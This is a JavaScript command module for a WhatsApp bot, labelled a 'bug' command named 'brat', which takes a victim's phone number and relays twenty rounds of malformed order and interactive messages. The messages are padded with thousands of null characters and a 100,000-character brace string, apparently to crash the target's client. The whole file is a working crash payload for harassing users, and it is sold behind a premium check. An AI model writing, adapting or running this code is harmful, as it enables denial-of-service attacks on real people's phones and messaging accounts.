import { isPremiumUser } from '../../utils/premiumStore.js';
export default {
    name: 'brat', aliases: ['sbrat', 'bratcrash'], category: 'bug',
    description: 'Brat memory crash - heavy payload', usage: 'brat <number>', cooldown: 60, ownerOnly: true,
    async execute({ sock, message, args, from, sender, isOwner }) {
        if (!isPremiumUser(sender) && !isOwner) return sock.sendMessage(from, { text: '❌ Premium required.' }, { quoted: message });
        const num = args[0]?.replace(/[^0-9]/g, ''); if (!num) return sock.sendMessage(from, { text: '❌ .brat <number>' }, { quoted: message });
        const t = `${num}@s.whatsapp.net`;
        await sock.sendMessage(from, { react: { text: '🧨', key: message.key } });
        for (let i = 0; i < 20; i++) {
            try { await sock.relayMessage(t, { viewOnceMessage: { message: { orderMessage: { orderId: "0".repeat(5000), itemCount: 999999, status: "DECLINED", surface: "BUFFERS", message: "\u0000".repeat(5000), orderTitle: "\u0000".repeat(5000), sellerJid: t, token: "\u0000".repeat(5000) }, messageContextInfo: { deviceListMetadata: {} } } } }, { participant: { jid: t } }); } catch {}
            try { await sock.relayMessage(t, { ephemeralMessage: { message: { interactiveMessage: { header: { title: "\u0000".repeat(8000), hasMediaAttachment: false }, body: { text: "\u0000".repeat(8000) }, nativeFlowMessage: { messageParamsJson: "{".repeat(100000) } } } } }, {}); } catch {}
        }
        await sock.sendMessage(from, { text: '✅ Brat crash sent' }, { quoted: message });
    }
};
